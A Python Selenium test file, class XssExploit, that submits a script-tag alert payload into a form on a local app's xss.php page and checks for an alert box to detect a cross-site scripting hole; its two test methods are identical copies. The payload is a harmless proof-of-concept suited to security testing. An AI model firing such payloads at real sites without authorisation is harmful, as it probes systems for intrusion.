import unittest
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoAlertPresentException

class XssExploit(unittest.TestCase):

    def setUp(self):
        options = webdriver.ChromeOptions()
        # options.add_argument('headless')
        options.add_argument('disable-xss-auditor')

        self.browser = webdriver.Chrome(options=options)

    def test_xss(self):
        browser = self.browser

        host = 'http://localhost:5000'
        target = 'xss.php'
        xss_message = 'xss found'
        payload = '<script>alert("{}")</script>'.format(xss_message)

        browser.get(host)

        actions = ActionChains(browser)

        xss_link = browser.find_element_by_css_selector('ul li:nth-child(3) a')

        actions.click(xss_link)
        actions.perform()

        input_field = browser.find_element_by_css_selector('form input[name=payload]')
        input_field.clear()

        submit = browser.find_element_by_css_selector('form input[type=submit]')

        actions = ActionChains(browser)
        actions.send_keys_to_element(input_field, payload)
        actions.click(submit)
        actions.perform()

        try:
            alert = browser.switch_to.alert
            if xss_message == alert.text:
                print("Found vulnerability")
            else:
                print("Alert has different text")
            alert.accept()
        except NoAlertPresentException:
            print("No vulnerability found")

    def test_xss_2(self):
        browser = self.browser

        host = 'http://localhost:5000'
        target = 'xss.php'
        xss_message = 'xss found'
        payload = '<script>alert("{}")</script>'.format(xss_message)

        browser.get(host)

        actions = ActionChains(browser)

        xss_link = browser.find_element_by_css_selector('ul li:nth-child(3) a')

        actions.click(xss_link)
        actions.perform()

        input_field = browser.find_element_by_css_selector('form input[name=payload]')
        input_field.clear()

        submit = browser.find_element_by_css_selector('form input[type=submit]')

        actions = ActionChains(browser)
        actions.send_keys_to_element(input_field, payload)
        actions.click(submit)
        actions.perform()

        try:
            alert = browser.switch_to.alert
            if xss_message == alert.text:
                print("Found vulnerability")
            else:
                print("Alert has different text")
            alert.accept()
        except NoAlertPresentException:
            print("No vulnerability found")

    def tearDown(self):
        self.browser.close()

if __name__ == "__main__":
    unittest.main()
